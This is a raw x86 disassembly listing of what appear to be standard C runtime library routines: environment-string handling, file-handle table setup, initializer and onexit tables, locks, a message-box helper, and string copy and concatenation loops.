  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
